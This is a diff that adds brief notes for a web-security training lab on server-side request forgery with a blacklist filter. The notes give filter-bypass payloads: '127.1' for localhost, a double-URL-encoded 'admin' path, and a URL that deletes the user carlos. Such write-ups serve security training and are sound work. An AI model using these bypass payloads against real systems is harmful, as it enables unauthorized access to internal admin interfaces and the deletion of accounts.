@@ -1,0 +1,18 @@
+SSRF with blacklist-based input filter
+
+Vulnerable feature - This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user Carlos.
+
+Goal - Change the stock check URL to access the admin interface at http://localhost/admin and delete the user Carlos.
+
+The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
+
+Analysis:
+
+localhost:: http://127.1/
+admin interface: http://127.1/%25%36%31dmin
+delete Carlos : http://127.1/%25%36%31dmin/delete?username=carlos
+
+- URL decoding one time check
+- regex search using a blacklist of strings
+
+python3 script.py <url> 
